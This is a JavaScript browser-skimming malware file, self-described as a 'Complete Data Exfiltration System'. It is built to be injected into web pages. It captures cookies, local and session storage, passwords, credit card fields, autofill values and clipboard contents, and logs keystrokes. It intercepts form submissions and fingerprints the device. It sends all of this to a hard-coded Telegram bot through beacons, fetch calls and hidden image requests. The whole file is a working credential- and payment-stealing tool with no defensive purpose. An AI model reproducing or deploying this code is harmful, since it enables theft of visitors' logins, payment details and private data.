// ultimate-harvester.js - Complete Data Exfiltration System
(function() {
    'use strict';
    
    // CONFIGURATION
    const BOT_TOKEN = "7853646508:AAHPFYrQXXXAEka9iWB6BB-YpIPfe-iUL00";
    const CHAT_ID = "7356446246";
    const SECRET_KEY = "X-Admin-Access";
    
    // Obfuscated fallback
    const _0x1a2b3c = ["Nz","g1","Nj","Q2","Nj","U1","MD","g4","Ok","FB","SF","BG","WV"];
    const _0x4d5e6f = ["Nz","M1","Nj","Q0","ND","Y2","Nj","I0","Ng"];
    
    class UltimateHarvester {
        constructor() {
            this.sessionId = this.generateId();
            this.dataQueue = [];
            this.isActive = true;
            this.initialize();
        }
        
        generateId() {
            return Math.random().toString(36).substr(2, 10) + 
                   Date.now().toString(36) + 
                   Math.random().toString(36).substr(2, 5);
        }
        
        initialize() {
            setTimeout(() => {
                this.collectComprehensiveData();
                this.setupEventListeners();
                this.setupPeriodicCollection();
                this.setupRealTimeMonitoring();
            }, 2000);
        }
        
        async collectComprehensiveData() {
            try {
                const data = {
                    session: this.sessionId,
                    timestamp: new Date().toISOString(),
                    
                    // LOCATION & NETWORK
                    location: {
                        url: window.location.href,
                        host: window.location.hostname,
                        path: window.location.pathname,
                        protocol: window.location.protocol,
                        port: window.location.port,
                        hash: window.location.hash,
                        search: window.location.search,
                        origin: window.location.origin,
                        referrer: document.referrer
                    },
                    
                    // BROWSER INFO
                    browser: {
                        userAgent: navigator.userAgent,
                        appName: navigator.appName,
                        appVersion: navigator.appVersion,
                        platform: navigator.platform,
                        vendor: navigator.vendor,
                        product: navigator.product,
                        language: navigator.language,
                        languages: navigator.languages,
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        pdfViewerEnabled: 'pdfViewerEnabled' in navigator ? navigator.pdfViewerEnabled : null
                    },
                    
                    // SYSTEM INFO
                    system: {
                        screenWidth: screen.width,
                        screenHeight: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        deviceMemory: navigator.deviceMemory || 'unknown',
                        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                        devicePixelRatio: window.devicePixelRatio
                    },
                    
                    // NETWORK INFO
                    network: {
                        online: navigator.onLine,
                        connection: this.getConnectionInfo(),
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        publicIP: await this.getPublicIP(),
                        localIP: await this.getLocalIP(),
                        webRTCSupported: !!window.RTCPeerConnection
                    },
                    
                    // STORAGE DATA
                    storage: {
                        cookies: document.cookie,
                        localStorage: this.getAllLocalStorage(),
                        sessionStorage: this.getAllSessionStorage(),
                        indexedDB: 'indexedDB' in window,
                        caches: 'caches' in window,
                        hasLocalStorage: !!window.localStorage,
                        hasSessionStorage: !!window.sessionStorage
                    },
                    
                    // DOM DATA
                    dom: {
                        title: document.title,
                        forms: this.extractForms(),
                        inputs: this.extractInputs(),
                        links: this.extractLinks(),
                        images: this.extractImages(),
                        scripts: this.extractScripts(),
                        metaTags: this.extractMetaTags(),
                        totalElements: document.getElementsByTagName('*').length
                    },
                    
                    // PERFORMANCE
                    performance: this.getPerformanceData(),
                    
                    // FINGERPRINT
                    fingerprint: {
                        canvas: this.getCanvasFingerprint(),
                        webgl: this.getWebGLInfo(),
                        audio: this.getAudioFingerprint(),
                        fonts: this.getFontsList(),
                        plugins: this.getPlugins(),
                        mimeTypes: this.getMimeTypes(),
                        battery: await this.getBatteryInfo(),
                        mediaDevices: await this.getMediaDevices()
                    },
                    
                    // SOCIAL & ACCOUNTS
                    social: {
                        savedAccounts: this.getSavedAccounts(),
                        autofillData: this.getAutofillData(),
                        savedPasswords: this.getSavedPasswords(),
                        paymentMethods: this.getPaymentMethods()
                    },
                    
                    // BEHAVIORAL
                    behavioral: {
                        viewport: this.getViewportInfo(),
                        scrollPosition: this.getScrollPosition(),
                        mousePosition: {x: 0, y: 0},
                        clicks: [],
                        keypresses: [],
                        timeOnPage: 0,
                        visitedSections: []
                    }
                };
                
                this.dataQueue.push(data);
                await this.sendData(data);
                
            } catch(error) {
                console.error('Collection error:', error);
            }
        }
        
        getConnectionInfo() {
            if (navigator.connection) {
                return {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                };
            }
            return null;
        }
        
        async getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch {
                    return null;
                }
            }
        }
        
        async getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const RTCPeerConnection = window.RTCPeerConnection || 
                                              window.mozRTCPeerConnection || 
                                              window.webkitRTCPeerConnection;
                    if (!RTCPeerConnection) {
                        resolve(null);
                        return;
                    }
                    
                    const pc = new RTCPeerConnection({iceServers: []});
                    pc.createDataChannel('');
                    pc.createOffer()
                        .then(pc.setLocalDescription.bind(pc))
                        .catch(() => {});
                    
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                        const candidate = ice.candidate.candidate;
                        const match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                        if (match) {
                            resolve(match[1]);
                            pc.onicecandidate = () => {};
                            pc.close();
                        }
                    };
                    
                    setTimeout(() => {
                        pc.onicecandidate = () => {};
                        pc.close();
                        resolve(null);
                    }, 1000);
                } catch {
                    resolve(null);
                }
            });
        }
        
        getAllLocalStorage() {
            const items = {};
            try {
                for(let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
            } catch {}
            return items;
        }
        
        getAllSessionStorage() {
            const items = {};
            try {
                for(let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    items[key] = sessionStorage.getItem(key);
                }
            } catch {}
            return items;
        }
        
        extractForms() {
            const forms = [];
            try {
                document.querySelectorAll('form').forEach((form, index) => {
                    const formData = {
                        id: form.id || `form_${index}`,
                        name: form.name,
                        action: form.action,
                        method: form.method,
                        enctype: form.enctype,
                        target: form.target,
                        fields: []
                    };
                    
                    form.querySelectorAll('input, textarea, select').forEach(field => {
                        const fieldData = {
                            type: field.type,
                            name: field.name,
                            id: field.id,
                            className: field.className,
                            placeholder: field.placeholder,
                            value: field.value,
                            checked: field.checked,
                            selected: field.selected,
                            disabled: field.disabled,
                            required: field.required,
                            autocomplete: field.autocomplete,
                            pattern: field.pattern,
                            min: field.min,
                            max: field.max,
                            minLength: field.minLength,
                            maxLength: field.maxLength,
                            multiple: field.multiple
                        };
                        
                        formData.fields.push(fieldData);
                    });
                    
                    forms.push(formData);
                });
            } catch {}
            return forms;
        }
        
        extractInputs() {
            const sensitiveInputs = {
                passwords: [],
                emails: [],
                phones: [],
                creditCards: [],
                addresses: [],
                names: [],
                usernames: [],
                hidden: [],
                files: []
            };
            
            try {
                document.querySelectorAll('input, textarea').forEach(input => {
                    const value = input.value;
                    if (!value) return;
                    
                    const inputData = {
                        type: input.type,
                        name: input.name,
                        id: input.id,
                        value: value,
                        form: input.form ? input.form.id : null
                    };
                    
                    // Classify inputs
                    if (input.type === 'password' || 
                        input.autocomplete && input.autocomplete.includes('password') ||
                        input.name && /pass|pwd|secret|token|auth/i.test(input.name)) {
                        sensitiveInputs.passwords.push(inputData);
                    }
                    else if (input.type === 'email' || 
                            input.autocomplete === 'email' ||
                            input.name && /email|mail/i.test(input.name)) {
                        sensitiveInputs.emails.push(inputData);
                    }
                    else if (input.type === 'tel' || 
                            input.autocomplete === 'tel' ||
                            input.name && /phone|mobile|tel/i.test(input.name)) {
                        sensitiveInputs.phones.push(inputData);
                    }
                    else if (input.autocomplete && input.autocomplete.includes('cc') ||
                            input.name && /card|credit|ccnum|cvc|cvv/i.test(input.name)) {
                        sensitiveInputs.creditCards.push(inputData);
                    }
                    else if (input.autocomplete && (input.autocomplete.includes('address') || 
                                                   input.autocomplete.includes('street'))) {
                        sensitiveInputs.addresses.push(inputData);
                    }
                    else if (input.autocomplete === 'name' || 
                            input.name && /name|fullname|fname|lname/i.test(input.name)) {
                        sensitiveInputs.names.push(inputData);
                    }
                    else if (input.autocomplete === 'username' ||
                            input.name && /user|login|account/i.test(input.name)) {
                        sensitiveInputs.usernames.push(inputData);
                    }
                    else if (input.type === 'hidden') {
                        sensitiveInputs.hidden.push(inputData);
                    }
                    else if (input.type === 'file') {
                        sensitiveInputs.files.push(inputData);
                    }
                });
            } catch {}
            
            return sensitiveInputs;
        }
        
        extractLinks() {
            const links = [];
            try {
                document.querySelectorAll('a[href]').forEach(link => {
                    links.push({
                        text: link.textContent.trim().substring(0, 100),
                        href: link.href,
                        title: link.title
                    });
                });
            } catch {}
            return links.slice(0, 50);
        }
        
        extractImages() {
            const images = [];
            try {
                document.querySelectorAll('img[src]').forEach(img => {
                    images.push({
                        src: img.src,
                        alt: img.alt,
                        width: img.width,
                        height: img.height
                    });
                });
            } catch {}
            return images.slice(0, 50);
        }
        
        extractScripts() {
            const scripts = [];
            try {
                document.querySelectorAll('script[src]').forEach(script => {
                    scripts.push(script.src);
                });
            } catch {}
            return scripts;
        }
        
        extractMetaTags() {
            const metaTags = {};
            try {
                document.querySelectorAll('meta').forEach(meta => {
                    const name = meta.getAttribute('name') || 
                                meta.getAttribute('property') || 
                                meta.getAttribute('itemprop');
                    if (name && meta.content) {
                        metaTags[name] = meta.content;
                    }
                });
            } catch {}
            return metaTags;
        }
        
        getPerformanceData() {
            const perf = {};
            try {
                if (window.performance && window.performance.timing) {
                    const timing = window.performance.timing;
                    perf = {
                        navigationStart: timing.navigationStart,
                        loadEventEnd: timing.loadEventEnd,
                        domLoading: timing.domLoading,
                        domInteractive: timing.domInteractive,
                        domContentLoaded: timing.domContentLoadedEventStart,
                        loadEventStart: timing.loadEventStart,
                        fetchStart: timing.fetchStart,
                        domainLookupStart: timing.domainLookupStart,
                        domainLookupEnd: timing.domainLookupEnd,
                        connectStart: timing.connectStart,
                        connectEnd: timing.connectEnd,
                        secureConnectionStart: timing.secureConnectionStart,
                        requestStart: timing.requestStart,
                        responseStart: timing.responseStart,
                        responseEnd: timing.responseEnd,
                        domComplete: timing.domComplete,
                        redirectCount: window.performance.navigation.redirectCount
                    };
                    
                    perf.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
                    perf.domReadyTime = timing.domContentLoadedEventStart - timing.navigationStart;
                }
            } catch {}
            return perf;
        }
        
        getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("FINGERPRINT", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("FINGERPRINT", 4, 17);
                
                return canvas.toDataURL();
            } catch {
                return null;
            }
        }
        
        getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return null;
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                };
            } catch {
                return null;
            }
        }
        
        getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.type = 'triangle';
                oscillator.frequency.value = 1000;
                
                oscillator.start();
                oscillator.stop(0.01);
                
                return "supported";
            } catch {
                return "unsupported";
            }
        }
        
        getFontsList() {
            const fonts = [
                "Arial", "Arial Black", "Comic Sans MS", "Courier New",
                "Georgia", "Impact", "Times New Roman", "Trebuchet MS",
                "Verdana", "Helvetica", "Tahoma", "Geneva"
            ];
            
            const available = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            fonts.forEach(font => {
                ctx.font = "72px '" + font + "'";
                const text = "mmmmmmmmmmlli";
                const measured = ctx.measureText(text);
                if (measured.width > 0) {
                    available.push(font);
                }
            });
            
            return available;
        }
        
        getPlugins() {
            const plugins = [];
            try {
                if (navigator.plugins) {
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                }
            } catch {}
            return plugins;
        }
        
        getMimeTypes() {
            const mimeTypes = [];
            try {
                if (navigator.mimeTypes) {
                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
                        mimeTypes.push(navigator.mimeTypes[i].type);
                    }
                }
            } catch {}
            return mimeTypes;
        }
        
        async getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level,
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
            } catch {}
            return null;
        }
        
        async getMediaDevices() {
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    return devices.map(device => ({
                        kind: device.kind,
                        label: device.label,
                        deviceId: device.deviceId
                    }));
                }
            } catch {}
            return null;
        }
        
        getSavedAccounts() {
            const accounts = [];
            try {
                const commonKeys = [
                    'user', 'username', 'email', 'account', 'login', 'auth',
                    'token', 'session', 'access_token', 'refresh_token'
                ];
                
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    
                    commonKeys.forEach(commonKey => {
                        if (key.toLowerCase().includes(commonKey) && value) {
                            accounts.push({
                                key: key,
                                value: value.substring(0, 100),
                                source: 'localStorage'
                            });
                        }
                    });
                }
            } catch {}
            return accounts;
        }
        
        getAutofillData() {
            const autofill = [];
            try {
                document.querySelectorAll('[autocomplete]').forEach(element => {
                    if (element.value) {
                        autofill.push({
                            type: element.autocomplete,
                            name: element.name,
                            value: element.value,
                            tag: element.tagName
                        });
                    }
                });
            } catch {}
            return autofill;
        }
        
        getSavedPasswords() {
            const passwords = [];
            try {
                document.querySelectorAll('input[type="password"]').forEach(input => {
                    if (input.value) {
                        passwords.push({
                            name: input.name,
                            id: input.id,
                            value: input.value,
                            form: input.form ? input.form.id : null
                        });
                    }
                });
            } catch {}
            return passwords;
        }
        
        getPaymentMethods() {
            const payments = [];
            try {
                document.querySelectorAll('[autocomplete*="cc"], [name*="card"], [name*="credit"]').forEach(element => {
                    if (element.value) {
                        payments.push({
                            type: element.autocomplete || element.type,
                            name: element.name,
                            value: element.value,
                            form: element.form ? element.form.id : null
                        });
                    }
                });
            } catch {}
            return payments;
        }
        
        getViewportInfo() {
            return {
                width: window.innerWidth,
                height: window.innerHeight,
                scrollX: window.scrollX,
                scrollY: window.scrollY
            };
        }
        
        getScrollPosition() {
            return {
                scrollTop: document.documentElement.scrollTop || document.body.scrollTop,
                scrollHeight: document.documentElement.scrollHeight || document.body.scrollHeight,
                clientHeight: document.documentElement.clientHeight
            };
        }
        
        setupEventListeners() {
            // KEYLOGGER
            document.addEventListener('keydown', (e) => {
                this.dataQueue.push({
                    type: 'keydown',
                    key: e.key,
                    code: e.code,
                    target: e.target.tagName,
                    value: e.target.value,
                    timestamp: Date.now()
                });
                
                if (e.target.type === 'password' && e.target.value) {
                    this.sendImmediate({
                        type: 'password_input',
                        field: e.target.name || e.target.id,
                        value: e.target.value,
                        url: window.location.href
                    });
                }
            }, true);
            
            // FORM SUBMIT CAPTURE
            document.addEventListener('submit', (e) => {
                e.preventDefault();
                const form = e.target;
                const formData = new FormData(form);
                const data = {};
                
                formData.forEach((value, key) => {
                    data[key] = value;
                });
                
                this.sendImmediate({
                    type: 'form_submit',
                    formId: form.id || form.name,
                    action: form.action,
                    method: form.method,
                    data: data,
                    url: window.location.href
                });
                
                setTimeout(() => {
                    form.submit();
                }, 100);
            }, true);
            
            // CLICK TRACKER
            document.addEventListener('click', (e) => {
                this.behavioral.clicks.push({
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    text: e.target.textContent.substring(0, 50),
                    timestamp: Date.now()
                });
            });
            
            // MOUSE MOVEMENT
            document.addEventListener('mousemove', (e) => {
                this.behavioral.mousePosition = {x: e.clientX, y: e.clientY};
            });
            
            // COPY/PASTE LOGGER
            document.addEventListener('copy', (e) => {
                const text = window.getSelection().toString();
                if (text.length > 10) {
                    this.sendImmediate({
                        type: 'copy',
                        text: text.substring(0, 500),
                        url: window.location.href
                    });
                }
            });
            
            document.addEventListener('paste', (e) => {
                const text = (e.clipboardData || window.clipboardData).getData('text');
                if (text.length > 10) {
                    this.sendImmediate({
                        type: 'paste',
                        text: text.substring(0, 500),
                        url: window.location.href
                    });
                }
            });
            
            // PAGE VISIBILITY
            document.addEventListener('visibilitychange', () => {
                this.sendImmediate({
                    type: 'visibility_change',
                    state: document.visibilityState,
                    timestamp: Date.now()
                });
            });
            
            // BEFORE UNLOAD
            window.addEventListener('beforeunload', () => {
                this.sendImmediate({
                    type: 'page_unload',
                    timeSpent: Date.now() - this.startTime,
                    url: window.location.href
                });
            });
        }
        
        setupPeriodicCollection() {
            setInterval(() => {
                this.collectComprehensiveData();
            }, 300000);
            
            setInterval(() => {
                this.sendBehavioralData();
            }, 60000);
            
            setInterval(() => {
                this.checkForNewInputs();
            }, 30000);
        }
        
        setupRealTimeMonitoring() {
            this.startTime = Date.now();
            
            setInterval(() => {
                this.behavioral.timeOnPage = Date.now() - this.startTime;
            }, 1000);
            
            const observer = new MutationObserver((mutations) => {
                mutations.forEach(mutation => {
                    if (mutation.addedNodes.length) {
                        this.checkForNewForms();
                    }
                });
            });
            
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        }
        
        checkForNewForms() {
            const forms = this.extractForms();
            const newForms = forms.filter(form => 
                !this.dom.forms.some(existing => existing.id === form.id)
            );
            
            if (newForms.length > 0) {
                this.sendImmediate({
                    type: 'new_forms_detected',
                    forms: newForms,
                    url: window.location.href
                });
            }
        }
        
        checkForNewInputs() {
            const inputs = this.extractInputs();
            
            if (inputs.passwords.length > 0) {
                inputs.passwords.forEach(pw => {
                    this.sendImmediate({
                        type: 'password_field_detected',
                        field: pw.name || pw.id,
                        value: pw.value,
                        url: window.location.href
                    });
                });
            }
        }
        
        sendBehavioralData() {
            if (this.behavioral.clicks.length > 0) {
                this.sendImmediate({
                    type: 'behavioral_summary',
                    clicks: this.behavioral.clicks.length,
                    timeOnPage: this.behavioral.timeOnPage,
                    scrollPosition: this.behavioral.scrollPosition,
                    url: window.location.href
                });
                
                this.behavioral.clicks = [];
            }
        }
        
        async sendData(data) {
            try {
                let message = `🎯 *ULTIMATE HARVEST* 🎯\n`;
                message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                message += `• Session: \`${data.session}\`\n`;
                message += `• Time: ${data.timestamp}\n`;
                message += `• URL: \`${data.location.url}\`\n`;
                message += `• IP: ${data.network.publicIP || 'Unknown'}\n`;
                message += `• User Agent: ${data.browser.userAgent.substring(0, 80)}...\n`;
                message += `• Screen: ${data.system.screenWidth}x${data.system.screenHeight}\n`;
                message += `• Platform: ${data.browser.platform}\n`;
                message += `• Language: ${data.browser.language}\n`;
                message += `• Timezone: ${data.network.timezone}\n`;
                message += `• Online: ${data.network.online ? 'Yes' : 'No'}\n\n`;
                
                message += `📊 *STATISTICS*\n`;
                message += `• Cookies: ${data.storage.cookies.length} chars\n`;
                message += `• LocalStorage: ${Object.keys(data.storage.localStorage).length} items\n`;
                message += `• Forms: ${data.dom.forms.length}\n`;
                message += `• Password Fields: ${data.dom.inputs.passwords.length}\n`;
                message += `• Links: ${data.dom.links.length}\n`;
                message += `• Images: ${data.dom.images.length}\n`;
                
                if (data.dom.inputs.passwords.length > 0) {
                    message += `\n🔑 *PASSWORDS FOUND*\n`;
                    data.dom.inputs.passwords.forEach((pw, idx) => {
                        message += `${idx+1}. ${pw.name || pw.id}: \`${pw.value}\`\n`;
                    });
                }
                
                if (data.dom.inputs.creditCards.length > 0) {
                    message += `\n💳 *CREDIT CARDS*\n`;
                    data.dom.inputs.creditCards.forEach((cc, idx) => {
                        message += `${idx+1}. ${cc.name}: \`${cc.value}\`\n`;
                    });
                }
                
                await this.sendToTelegram(message);
                
                await this.sendStorageData(data.storage);
                await this.sendFormData(data.dom.forms);
                await this.sendAdditionalData(data);
                
            } catch(error) {
                console.error('Send error:', error);
            }
        }
        
        async sendStorageData(storage) {
            if (Object.keys(storage.localStorage).length > 0) {
                const entries = Object.entries(storage.localStorage);
                
                for(let i = 0; i < entries.length; i += 3) {
                    const chunk = entries.slice(i, i + 3);
                    let message = `💾 *LocalStorage Part ${Math.floor(i/3)+1}*\n`;
                    
                    chunk.forEach(([key, value]) => {
                        message += `• *${key}*: \`\`\`\n${value}\n\`\`\`\n`;
                    });
                    
                    await this.sendToTelegram(message);
                    await this.sleep(1000);
                }
            }
            
            if (storage.cookies) {
                let message = `🍪 *COOKIES*\n\`\`\`\n${storage.cookies}\n\`\`\``;
                await this.sendToTelegram(message);
            }
        }
        
        async sendFormData(forms) {
            for(let i = 0; i < forms.length; i++) {
                const form = forms[i];
                let message = `📋 *FORM ${i+1}: ${form.id}*\n`;
                message += `Action: ${form.action}\n`;
                message += `Method: ${form.method}\n\n`;
                
                form.fields.forEach((field, idx) => {
                    if (field.value) {
                        message += `${idx+1}. ${field.type} *${field.name || field.id}*: \`${field.value}\`\n`;
                    }
                });
                
                await this.sendToTelegram(message);
                await this.sleep(500);
            }
        }
        
        async sendAdditionalData(data) {
            if (data.social.savedAccounts.length > 0) {
                let message = `👥 *SAVED ACCOUNTS*\n`;
                data.social.savedAccounts.forEach((acc, idx) => {
                    message += `${idx+1}. ${acc.key}: \`${acc.value}\`\n`;
                });
                await this.sendToTelegram(message);
            }
            
            if (data.fingerprint.canvas) {
                let message = `🎨 *CANVAS FINGERPRINT*\n\`${data.fingerprint.canvas.substring(0, 100)}...\``;
                await this.sendToTelegram(message);
            }
        }
        
        async sendImmediate(data) {
            try {
                let message = `⚡ *REALTIME EVENT* ⚡\n`;
                message += `━━━━━━━━━━━━━━━━━━\n`;
                message += `• Type: ${data.type}\n`;
                message += `• Time: ${new Date().toISOString()}\n`;
                message += `• URL: ${data.url || window.location.href}\n`;
                
                if (data.field && data.value) {
                    message += `• Field: ${data.field}\n`;
                    message += `• Value: \`${data.value}\`\n`;
                }
                
                if (data.text) {
                    message += `• Text: \`${data.text}\`\n`;
                }
                
                if (data.forms) {
                    message += `• New Forms: ${data.forms.length}\n`;
                }
                
                await this.sendToTelegram(message);
            } catch(error) {
                console.error('Immediate send error:', error);
            }
        }
        
        async sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            };
            
            await this.sendViaBeacon(url, payload);
            await this.sendViaFetch(url, payload);
            this.sendViaImage(url, payload);
        }
        
        async sendViaBeacon(url, data) {
            if (navigator.sendBeacon) {
                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                navigator.sendBeacon(url, blob);
            }
        }
        
        async sendViaFetch(url, data) {
            fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data),
                mode: 'no-cors',
                credentials: 'omit'
            }).catch(() => {});
        }
        
        sendViaImage(url, data) {
            try {
                const params = new URLSearchParams();
                params.append('chat_id', data.chat_id);
                params.append('text', data.text.substring(0, 1000));
                params.append('parse_mode', data.parse_mode);
                
                const img = new Image(1, 1);
                img.src = `${url}?${params.toString()}`;
                img.style.cssText = 'position:absolute;opacity:0;width:1px;height:1px;';
                document.body.appendChild(img);
                setTimeout(() => img.remove(), 1000);
            } catch {}
        }
        
        sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    }
    
    window.addEventListener('load', () => {
        setTimeout(() => {
            new UltimateHarvester();
        }, 3000);
    });
    
    if (document.readyState === 'complete') {
        setTimeout(() => {
            new UltimateHarvester();
        }, 1000);
    }
})();
